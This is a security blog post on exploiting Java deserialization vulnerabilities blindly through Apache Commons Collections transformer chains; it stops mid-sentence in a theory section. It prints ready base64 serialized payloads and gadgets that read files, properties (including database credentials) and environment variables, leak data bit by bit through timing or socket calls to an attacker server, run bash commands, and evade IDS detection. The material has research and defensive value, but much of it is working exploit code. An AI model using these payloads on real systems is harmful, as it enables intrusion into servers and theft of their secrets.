---
layout: post
title:  "Blind Java Deserialization Vulnerability - Commons Gadgets"
date:   2016-09-02 08:00:00 +0200
categories: blog
tags: hacking java deserialization commons blind
excerpt_separator: <!-- more -->

---

TL;DR: Exploitation of Java Deserialization vulnerability in restricted environments (firewalled system, updated Java).
Technique similar to blind SQL injection enables to extract data from the target system (read files, properties, env vars).

<!-- more -->

**Parts:**

1. [Introduction](#introduction)
1. [Sending data back from the victim](#databack)
1. [Payload builder & exploitation](#server)
1. [Gadgets](#gadgets)
    1. [Terminating transformer chain](#terminating)
    1. [Wrapping in collections](#wrapping)
    1. [Back connect gadgets](#backconnect)
    1. [Classloading gadgets](#classloader)
    1. [File exists test](#fileexists)
    1. [String reading](#strings)
    1. [File reading](#fileread)
    1. [Reading properties](#properties)
    1. [Reading environment variables](#systemenv)
    1. [OS detection](#osdetect)
    1. [Sending character over a socket](#stringOverSocket)
    1. [SecurityManager](#securityManager)
    1. [Executing command, waiting for finish](#execWait)
1. [Conclusion](#conclusion)

## Introduction {#introduction}

Java Deserialization vulnerability is a very nice way to get Remote Code Execution (RCE) on the target system.
[ysoserial] tool provides a lot of exploits that enable RCE via different paths/libraries. In this article I focus on Apache Commons
library as it is very common.

There are 2 main Commons exploits classes (w.r.t. payload construction):

* One uses _[javassist]_ for payload construction. It takes Java code (payload) as a string, builds bytecode from it and constructs
final serialized shellcode.
This is a very strong approach as we can basically express every program with it (e.g., reverse shell). Unfortunately if the system
running the Java program is updated (Java) this method won't work as essential classes do not allow bytecode execution anymore.
I won't go into these kind of exploits as it is easy to patch them. If they are not patched, you can build you own gadgets
quite easily.

* Another one uses chain of Transformers - objects defined in Commons library, which can be leveraged to do RCE
using reflection by crafting the chain. In this case we loose expressivity as the code being executed on the target machine has
to be expressed via chain of Transformers. Only small subgroup of programs can be expressed using these gadgets. This
makes building nice gadgets for this class of exploit challenging.
Fortunately for us, it enables RCE - system command execution.
In this article I focus on interesting gadgets one can construct using this method.

So if the server running the vulnerable Java server is updated (i.e., Java is updated), the first class of exploits won't work.
Well, we can still do RCE. Typical scenario would be to run reverse shell on the target machine. I.e., let
vulnerable Java server connect to our server and execute all commands we send to it.

But what if the system is firewalled so well no outgoing connections can leave the vulnerable machine? Or if there
are strong _SecurityManager_ policies in place? Then we cannot communicate with the target system directly. RCE is nice
but without communication we can hardly see the result of our payload being executed.

In that case we need to learn more information about the target system and find a way to send data back to us.
For the communication we use covert channels as in case of Blind SQL Injection.

## Sending data back from the victim {#databack}
If we are lucky enough, the target system shows us an error when we want it to show.
Then we can construct payloads like:

```java
if (System.getProperty("user.name").equals("root")){
    throw new Exception();
}
```

This gives us 1 bit of information at a time. If current user is a "root", page produces an Exception and we know the user.
Otherwise the page loads normally.

If this is not the case and the server filters exceptions somehow
we can use the timing approach which works very well but takes some time and is not 100% reliable.

```java
if (System.getProperty("user.name").equals("root")){
    Thread.sleep(7000);
}
```

In this case page load sleeps for 7 seconds if current user is root. [sqlmap] uses the same approach to read entire databases.
It uses binary search on the characters to read the strings and send them to the attacker. E.g. the following
code sleeps for 7 seconds if the first character is in the interval of `a-j`. We can learn the first character of the string
in `ceil(log(N))` queries where N is size of the alphabet. When using printable ASCII alphabet with 101 characters its 7 steps.

```java
if (System.getProperty("user.name").substring(0, 1).matches("[a-j]")) {
    Thread.sleep(7000);
}
```

There are also problems with this method. If network connection is not good enough it adds noise and some queries
can be interpreted in a wrong way (i.e., page did not sleep, loading still took a long time).

## Payload builder & exploitation {#server}

It's not necessary to understand the whole principle of Java Deserialization vulnerability in order to understand this article.
For those unfamiliar with all the technical details is safe to assume the upper payload is constructed (by [ysoserial] tool) in such a way
the deserialization leads to executing the top [Transformer](#transformers) object which is serialized in the payload.
Transformers can contain another transformers and with this we construct useful exploitation gadget.
If you want to know more, I recommend [Understanding ysoserial's CommonsCollections1 exploit] and
[What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability].

In this article we present ideas of exploitation in restricted environment. We state gadgets that we deem
useful and that are possible to express in chain of Transformers. Transformation of the code to the
Transformer chain is demonstrated.

For practical demonstration of this blind approach see the [part2] of our blogpost.

## Gadgets {#gadgets}
The sleep gadget is very nice to detect if the system is vulnerable to given class of exploits.
So instead of running `calc.exe` (as [ysoserial] uses for demo) we do `Thread.sleep(7000);`. If system is vulnerable,
page sleeps for a while. Bam.

Gadget for sleep:

```java
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
        new Class[]{
                String.class, Class[].class
        },
        new Object[]{
                "sleep", new Class[]{Long.TYPE}
        }),
new InvokerTransformer("invoke",
        new Class[]{
                Object.class, Object[].class
        }, new Object[]
        {
                null, new Object[] {7000L}
        }),
```

Working payload for Commons1 exploit:

```
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEGphdmEubGFuZy5UaHJlYWQAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AAVzbGVlcHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAARsb25nAAAAAAAAAAAAAAB4cHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAFzcgAOamF2YS5sYW5nLkxvbmc7i+SQzI8j3wIAAUoABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAAAAG1h0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgARdnIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHNxAH4AFnB0AAtuZXdJbnN0YW5jZXBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAQdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHBxAH4AOg==
```

### Terminating transformer chain {#terminating}
The Commons1 Transformer gadgets have a typical structure (by [ysoserial]):

```java
doSomethingTransformer,
new ConstantTransformer(1)
```

The final _[ConstantTransformer](#ConstantTransformer)_ causes an exception during deserialization (after our payload executes). You may want it like
this. But if you want to page load successfully in some cases, the exception is not desirable. The upper gadget layer expects a Set
object (gets Integer - exception). To avoid the exception the last chain should create a set instance:

```java
new ConstantTransformer(java.util.HashSet.class),
new InvokerTransformer("newInstance",
        null, null )
```

### Wrapping in collections {#wrapping}
[ysoserial] tool generates payloads which are after deserialization seen as `sun.reflect.annotation.AnnotationInvocationHandler`.
If you deserialize the example payload from the above, it will be of this type.

If your vulnerable application expects a collection it usually throws ClassCastException.
You can actually avoid this ClassCastException by wrapping payload inside the collection to let application feel OK and
still execute our payload during deserialization.

For example if application expects a List, we can construct a List and add payload as another list element.
It still get executed, but without exception being thrown (if we are lucky and application ignores unknown element).

```
rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAADdwQAAAADc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF0AAtIZWxsbyB3b3JsZHNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AAZzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEGphdmEubGFuZy5UaHJlYWQAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AAVzbGVlcHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAARsb25nAAAAAAAAAAAAAAB4cHQACWdldE1ldGhvZHVxAH4AJAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ACRzcQB+ABx1cQB+ACEAAAACcHVxAH4AIQAAAAFzcgAOamF2YS5sYW5nLkxvbmc7i+SQzI8j3wIAAUoABXZhbHVleHEAfgADAAAAAAAAG1h0AAZpbnZva2V1cQB+ACQAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAhc3EAfgAXdnIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHNxAH4AHHB0AAtuZXdJbnN0YW5jZXBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAQdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHBxAH4AP3g=
```

Payload gets executed during deserialization. After that the resulting type is `LinkedList` with contents:
`[1, Hello world, sun.reflect.annotation.AnnotationInvocationHandler@345dc05c]`.

Even better is if the application serializes a `Map` (e.g., settings). You can sneak payload to the HashMap
under the key application does not use. In that case payload gets executed and application does not throw an exception.

Our modified version of [ysoserial] demonstrates how to wrap payload in other structures.

### Back connect gadgets {#backconnect}
In order to test if the system is firewalled or if it is allowed to make connections to the internet we can
construct the following gadget:

```java
Socket.class.getConstructor(String.class, Integer.TYPE).newInstance("ourserver.com", 80).sendUrgentData(0xdd);
```

Converted to Transformer chain:

```java
new ConstantTransformer(Socket.class),
    new InvokerTransformer("getConstructor",
            new Class[]{
                    Class[].class
            },
            new Object[]{
                    new Class[] { String.class, Integer.TYPE }
            }),
    new InvokerTransformer("newInstance",
            new Class[]{
                    Object[].class
            },
            new Object[]{
                    new Object[] {host, port}
            }),
    new InvokerTransformer("sendUrgentData",
            new Class[]{
                    Integer.TYPE
            },
            new Object[]{
                    0xdd
            }),
```

With this gadget we can send some static data to our server. On ourserver.com we trace
incoming packets. If a new TCP connection from our target host is made, with Urgent flag and 0xdd byte we know
the JVM is allowed to connect to the remote host.

_SendUrgentData_ part is optional. We can leave it out. Firewall may be configured to drop/log Urgent data. So we may
avoid detection by IDS without the urgent data. Socket should still make TCP handshake - visible in packet trace.

It would be also nice to call the following gadget to write to the output stream directly:

```java
Socket.class.getConstructor(String.class, Integer.TYPE).newInstance("ourserver.com", 80).getOutputStream().write(0xdd);
```

But this is not possible due to limitation of reflection invocation properties of [InvokerTransformer](#InvokerTransformer).
For more info why its not possible read article till the end :)
(TL;DR: output stream returned is actually SocketOutputStream which is package local - write() method cannot be called this way).

### Classloading gadgets {#classloader}
This very simple gadget tries to load a class defined by a fully specified class name.
If loading of such class ends with an exception we know it was not found by the Classloader.

If vulnerable app behaves differently on exception its straightforward. Otherwise
we adapt the payload to Sleep after loading the class - if class exists on the classpath, exception is not thrown and Sleep
will get executed.

Classloading gadget can be used to detect if library is present on the system or to detect major Java version running the application.

The gadget is:

```java
Class.forName(className);
```

Translated to Transformer chains:

```java
new ConstantTransformer(Class.class),
new InvokerTransformer("forName",
        new Class[]{
                String[].class
        },
        new Object[]{
                className
        })
```

With this we can check:

* `org.apache.commons.io.FileUtils` for Apache commons-io
* `java.util.logging.SocketHandler` should exist from Java 4. Has `@since 1.4` annotation.
* `java.lang.ProcessBuilder` for Java 5+
* `java.util.concurrent.LinkedBlockingDeque` for Java 6+
* `java.util.concurrent.ConcurrentLinkedDeque` for Java 7+
* `java.util.stream.Collectors` for Java 8+

### File exists test {#fileexists}

This forms a predicate gadget, returning true if file exists.
Note SecurityManager may be in place and code can throw an exception - we will handle that later.

```java
if (File.class.getConstructor(String.class).newInstance(path).exists()){
    Thread.sleep(7000);
}
```

After conversion to transformer chain:

```java
TransformerUtils.switchTransformer(
    PredicateUtils.asPredicate(
        new ChainedTransformer( new Transformer[] {
            new ConstantTransformer(File.class),
            new InstantiateTransformer(
                    new Class[]{
                            String.class
                    },
                    new Object[]{
                            path
                    }),
            new InvokerTransformer("exists", null, null)
        })
    ),

    new ChainedTransformer( new Transformer[] {
        new ConstantTransformer(Thread.class),
        new InvokerTransformer("getMethod",
                new Class[]{
                        String.class, Class[].class
                },
                new Object[]{
                        "sleep", new Class[]{Long.TYPE}
                }),
        new InvokerTransformer("invoke",
                new Class[]{
                        Object.class, Object[].class
                }, new Object[]
                {
                        null, new Object[] {7000L}
                })
    }),

    TransformerUtils.nopTransformer();)
```

This looks more complicated and consists of more sub-components.
We made utility functions to make gadget construction simpler, e.g., sleeping gadget
is independent component and can be constructed by a dedicated method. For more see TODO: XXX.

This construction can be easily generalized to a form `if (predicate) do action` where `action`
can be

* `Thread.sleep(7000)`
* Throwing an exception
* Connecting with the socket

There are more interesting methods returning boolean that can be used to leak something useful
(e.g., `canRead`, `canWrite`, string methods).

### String reading {#strings}
Transformers cannot be used in such a way result of the computation (i.e., file read to string) is a parameter of the method.
Thus it is not possible to read file into string and send the whole string over a socket.

We can call only methods on the result. If it is a string we can do:

* `string.isEmpty()` predicate to test if string is empty.
* `string.contains(staticString)`
* `string.startsWith(staticString)`
* `string.endsWith(staticString)`
* `string.equals(staticString)`
* `string.equalsIgnoreCase(staticString)`
* `string.substring(0, x)` for getting portion of the string or checking the string length. IndexOutOfBoundsException is thrown.
* `string.substring(0, x).matches("[a-j]")` predicate for binary searching the x-th character.

The last one is quite important gadget. With this we can basically read all the strings but
for that we would need a tool that does the search on the fly - generates payloads and processes the results.

### File reading {#fileread}
The following gadget reads the whole file into a string using a trick with _Scanner_:

```java
String fileContents = new Scanner(new File("filename")).useDelimiter("\\Z").next();
```

Converted to transformer chain:

```java
new ConstantTransformer(Class.class),
new InvokerTransformer("forName",
    new Class[]{
            String[].class
    },
    new Object[]{
            "java.util.Scanner"
    }),
new InstantiateTransformer(
        new Class[]{
                File.class
        },
        new Object[]{
                new File(path) // File is serializable
        }),
new InvokerTransformer("useDelimiter",
        new Class[]{
                String.class
        },
        new Object[]{
                "\\Z"
        }),
new InvokerTransformer("next",
        null,
        null)
```

The result is string and we can call methods on it.

### Reading properties {#properties}
There can be a lot of interesting stuff stored in the properties - e.g., username & password to the database.

```java
System.getProperty("spring.datasource.url");
```

Interesting properties (taken from [SO01]):

```java
// Operating system name
System.getProperty("os.name");

// Operating system version
System.getProperty("os.version");

// Path separator character used in java.class.path
System.getProperty("path.separator");

// User working directory
System.getProperty("user.dir");

// User home directory
System.getProperty("user.home");

// User account name
System.getProperty("user.name");

// Operating system architecture
System.getProperty("os.arch");

// Sequence used by operating system to separate lines in text files
System.getProperty("line.separator");

// JRE version number
System.getProperty("java.version");

// JRE vendor URL
System.getProperty("java.vendor.url");

// JRE vendor name
System.getProperty("java.vendor");

// Installation directory for Java Runtime Environment (JRE)
System.getProperty("java.home");

// Class path - what other interesting libraries we have?
System.getProperty("java.class.path");
```

(Conversion to transformer chain is simple call of static method - was demonstrated earlier, for more info see source codes)

### Reading environment variables {#systemenv}
The same holds for environment variables - also valuable source of information.

```java
System.getenv("PATH");
```

### OS detection {#osdetect}
Classical OS detection can be done via _nmap_

```sh
nmap targethost.com -O -v
```

But this scanning technique requires 1 open and 1 closed port to be reliable. Closed ports are problem to get because
firewalls often filter incoming requests - SYN packet is dropped.

```java
System.getProperty("os.name").toLowerCase().startsWith("windows")
System.getProperty("os.name").toLowerCase().contains("mac")
System.getProperty("os.name").toLowerCase().contains("darwin")
System.getProperty("os.name").toLowerCase().contains("nux")
System.getProperty("os.name").toLowerCase().contains("sunos")
```

Another approach to OS detection (Windows vs. Linux vs. FreeBSD vs. MAC) is to check for file existence typically stored
in differed locations on different systems, e.g., cmd.exe or ping, ifconfig, ipconfig, ip, telnet, netstat, ...
Typical locations the command can be stored:

```sh
/bin
/sbin
/usr/bin
/usr/sbin
```

### Sending character over a socket {#stringOverSocket}
Guessing string characters by binary search requires some queries to do.
It would be much faster if we could send individual characters over the socket to our server, assuming
the socket approach works - system is not firewalled.

As mentioned above it is not possible to use result as a method parameter. We cannot construct gadget
which directly sends a character over the socket. To overcome this limitation we can use
[SwitchTransformer](#SwitchTransformer) and hack it a bit with enumeration:

```
     if (inp.equals("\u0000")) sendTcp(host, port, 0x00)
else if (inp.equals("\u0001")) sendTcp(host, port, 0x01)
else if (inp.equals("\u0002")) sendTcp(host, port, 0x02)
  .
  .
  .
else if (inp.equals("\u007f")) sendTcp(host, port, 0x7f)
else                           sendTcp(host, port, 0xff) //unknown
```

We already know its possible execute an action if predicate is true.
To combine more such blocks [SwitchTransformer](#SwitchTransformer) can be used.

Its reasonable to support only ASCII characters to keep gadget size low.
We use this anyway for dumping config files - should not contain UTF8 strings.
Note this is code heavy, payload like this occupies quite a lot of space.

### SecurityManager {#securityManager}
Some methods may fail due to strict _SecurityManager_ settings. But usually it is not possible to tell Exceptions apart.
To fingerprint the SecurityManager policy we can directly check if the particular operation is permitted before actually
executing it.

The following gadgets throw SecurityException if given action is blocked by the policy.

```java
// It is allowed to connecto to host:port?
System.getSecurityManager().checkConnect(host, port);

// Execute command
System.getSecurityManager().checkExec(command)

// File access
System.getSecurityManager().checkRead(file);
System.getSecurityManager().checkWrite(file);
System.getSecurityManager().checkDelete(file);

// Has access to the java package
System.getSecurityManager().checkPackageAccess(pkg);

// Has access to the System.getProperty(property)
System.getSecurityManager().checkPropertyAccess(property);
```

### Executing command, waiting for finish {#execWait}
Since the expressive power of the transformer language is quite low
we can use also another approach - call shell commands and signalize result with `sleep` as we did with `Thread.sleep()`.

For this it would be great to call:

```java
Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "something && sleep 7"}).waitFor();
```

Shell gives us full expressive power. Unfortunately waitFor cannot be called, because exec() method returns
package-local Process implementation which cannot be used with [InvokerTransformer](#InvokerTransformer).

We can instead use the following hack to wait for process to finish.

```java
final String fname = "/tmp/.x" + Math.abs(rnd.nextInt());
final String[] exc = new String[] {"/bin/bash", "-c", "something && sleep 7; touch " + fname + "; sleep 2; /bin/rm " + fname};
```

It performs the computation (something) and the blind sleep technique to return the output.
Then it creates a temporary file and deletes it after
a while. The file signalizes to our waiting Java thread the task has finished.
For this to work we have to check if we are allowed to create and delete temporary files (SecurityManager, File.canWrite()).

If yes it is still quite risky because it leaves traces. If something goes wrong the files will be left on the system.
We can try to delete them from time to time, but still...

Now we need a gadget that will sleep until it detects the temporary file our gadget created. For that we will make use of
[WhileClosure](#WhileClosure) and [ForClosure](#ForClosure) together with [File existence predicate](#fileexists).

```java
for(i=0; i<80; i++)
    while(!fileExists(fname)) Sleep(250);
```

The for loop is here to avoid infinite loop on the file check - it defines the maximum amount of time to wait for process to complete.
If something goes wrong and file does not get created the application would freeze. We don't want to DoS the application (yet) and attract attention.
If the file gets created the loop quickly finishes and the page blocking ends.

## Conclusion {#conclusion}

We aimed to demonstrate the exploitation in restricted environments with use of blind technique, inspired by
Blind SQL Injection attacks. With given gadgets its possible to gather interesting information about the target
system and maybe mount another attacks which would not be possible via deserialization vulnerability otherwise.

We made utilities to generate the payloads and to test them before using them on real targets.
This is especially useful to test blind techniques like string guessing with bisection.
Our further work is to automate this exploitation technique in the same way as [sqlmap] does.

If you like to know more on gadget constructions and limitations, keep reading.

## Digging deeper - Theory {#deeper}
In the following section we will take a closer look on gadget constructions and tool arsenal we can use for that.

### Basic commons1 exploit chain {#commons1}

In order to understand how the gadgets are constructed and executed on the target
machine lets go through the gadget taken from [ysoserial] project - RCE.

```java
final Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),

    new InvokerTransformer("getMethod",
        new Class[] {
            String.class, Class[].class },
        new Object[] {
            "getRuntime", new Class[0] }),

    new InvokerTransformer("invoke",
        new Class[] {
            Object.class, Object[].class },
        new Object[] {
            null, new Object[0] }),

    new InvokerTransformer("exec",
        new Class[] {
            String[].class },
        new Object[] {
            new String[]{"/bin/bash", "-c", "sleep 5"} }),
        cmdType, execArgs),

    new ConstantTransformer(1) };
```

The code essentially aims to execute the following:

```java
Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "sleep 5"});
```

This needs a rewriting a bit because we cannot construct gadget exactly like this.
We need to use some Transformer from our toolbox to do the job.
_[ConstantTransformer](#ConstantTransformer)_ accepts serializable object, so we initialize it with `Runtime.class` which
is serializable. Then we can chain multiple invocations with _[InvokerTransformer](#InvokerTransformer)_

```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"/bin/bash", "-c", "sleep 5"});
```

After translation to Transformer language the final code that gets executed on the host looks like this:

```java
// Constant transformer 1
Object input = Runtime.class;

// Invocation transformer 1
Class cls = input.getClass();
Method method = cls.getMethod("getMethod", String.class, Class[].class);
input = method.invoke(input, "getRuntime", new Class[0]);

// Invocation transformer 2
cls = input.getClass();
method = cls.getMethod("invoke", Object.class, Object[].class);
input = method.invoke(input, null, new Object[0]);

// Invocation transformer 3
cls = input.getClass();
method = cls.getMethod("exec", String[].class);
input = method.invoke(input, new Object[]{new String[]{"/bin/bash", "-c", "sleep 5"}});
```

## Language and expresivity {#lang}
There are 3 basic types of objects in the Commons language we can use to build our payload / gadgets.

*  Transformers
*  Predicates
*  Closures

### Transformers {#transformers}
  A `Transformer` (functor) converts the input object to the output object.
  The input object should be left unchanged. Transformers can be chained.

  Standard implementations of common transformers are provided by
  `TransformerUtils`. These include method invocation, returning a constant,
  cloning and returning the string value.

```java
package org.apache.commons.collections;
public interface Transformer {
    public Object transform(Object input);
}
```

List of the Transformers:
[ChainedTransformer](#ChainedTransformer),
[CloneTransformer](#CloneTransformer),
[ClosureTransformer](#ClosureTransformer),
[ConstantTransformer](#ConstantTransformer),
[ExceptionTransformer](#ExceptionTransformer),
[FactoryTransformer](#FactoryTransformer),
[InstantiateTransformer](#InstantiateTransformer),
[InvokerTransformer](#InvokerTransformer),
[MapTransformer](#MapTransformer),
[NOPTransformer](#NOPTransformer),
[PredicateTransformer](#PredicateTransformer),
[StringValueTransformer](#StringValueTransformer),
[SwitchTransformer](#SwitchTransformer).

### Predicates {#predicates}
  A `Predicate` is the object equivalent of an `if` statement.
  Evaluates an expression on input object, returns true/false. Can be used in
  [IfClosure](#IfClosure), [SwitchClosure](#SwitchClosure), [SwitchTransformer](#SwitchTransformer), [WhileClosure](#WhileClosure).

  Standard implementations of common predicates are provided by
  `PredicateUtils`. These include true, false, instanceof, equals, and,
  or, not, method invocation and null testing.

```java
package org.apache.commons.collections;
public interface Predicate {
    public boolean evaluate(Object object);
}
```

List of the Predicates:
[TruePredicate](#TruePredicate),
[FalsePredicate](#FalsePredicate),
[NotPredicate](#NotPredicate),
[AndPredicate](#AndPredicate),
[OrPredicate](#OrPredicate),
[AllPredicate](#AllPredicate),
[AnyPredicate](#AnyPredicate),
[NonePredicate](#NonePredicate),
[OnePredicate](#OnePredicate),
[EqualPredicate](#EqualPredicate),
[IdentityPredicate](#IdentityPredicate),
[InstanceofPredicate](#InstanceofPredicate),
[NullPredicate](#NullPredicate),
[NotNullPredicate](#NotNullPredicate),
[NullIsExceptionPredicate](#NullIsExceptionPredicate),
[NullIsFalsePredicate](#NullIsFalsePredicate),
[NullIsTruePredicate](#NullIsTruePredicate),
[ExceptionPredicate](#ExceptionPredicate),
[TransformedPredicate](#TransformedPredicate),
[TransformerPredicate](#TransformerPredicate),
[UniquePredicate](#UniquePredicate).

### Closures {#closures}
  A `Closure` represents a block a code, takes input, produces nothing.
  Used in loops.

 Standard implementations of common closures are provided by
 `ClosureUtils`. These include method invocation and for/while loops.

```java
package org.apache.commons.collections;
public interface Closure {
    public void execute(Object input);
}
```

List of the Closures:
[ChainedClosure](#ChainedClosure),
[ExceptionClosure](#ExceptionClosure),
[ForClosure](#ForClosure),
[IfClosure](#IfClosure),
[NOPClosure](#NOPClosure),
[SwitchClosure](#SwitchClosure),
[TransformerClosure](#TransformerClosure),
[WhileClosure](#WhileClosure).

### Expresivity {#expressivity}
Using the given tools we can construct chains which perform something actually useful.

Using _[ConstantTransformer](#ConstantTransformer)_ and _[InvokerTransformer](#InvokerTransformer)_
we can construct chains like this:

```java
SerializableConstant.method1(const).method2(const)....methodN(const);
```

This is followed also by _[ysoserial]_ exploit, very easy one. Few important things to notice:

#### Serializable static chain start
 _ConstantTransformer_ can accept only Serializable objects in order to work in payload. e.g.,
 _String_, _File_, _Class_, _Object[]_, _Long_, ...

 On the other hand we can start with different Transformer, e.g., _[InstantiateTransformer](#InstantiateTransformer)_
 to create a new instance as a start of the chain.

#### Serializable static method arguments
Due to _[InvokerTransformer](#InvokerTransformer)_ internal mechanism, we cannot pass result of the computation as a
method argument. All method arguments have to be also Serializable objects, created in time of payload
generation. E.g., it is not possible to construct a gadget like:
`sendFile(readFile("/etc/passwd"));`

#### Some methods cannot be called at all

For example it is not possible to do:

```java
Runtime.getRuntime().exec(cmd).waitFor();
```

The reason is the returned object after `exec(cmd)` is expected to be a _Process_ object so according to the interface.
Thus it should be possible to call `waitFor` method. But the real returned object is `UNIXProcess` (in my case)
which is _package local_. _[InvokerTransformer](#InvokerTransformer)_ essentially does:

```java
Class cls = input.getClass(); // input instanceof UNIXProcess
Method method = cls.getMethod(iMethodName, iParamTypes);
return method.invoke(input, iArgs);
```

Reflection call on the package local object fails, the method is not accessible. We could try to hack it with calling
`input.getMethod("waitFor).setAccessible(true)` but then we would need to do `waitForMethod.invoke(process)`
- object to call method on is the first argument of _invoke_ method. But as we mentioned in point above, we cannot pass results as arguments
 in our gadgets.

### Closures and predicates
With using Closures and Predicates we can do even more things and express complicated code paths.
So far we called a method on a previously returned result. At some point we may need to
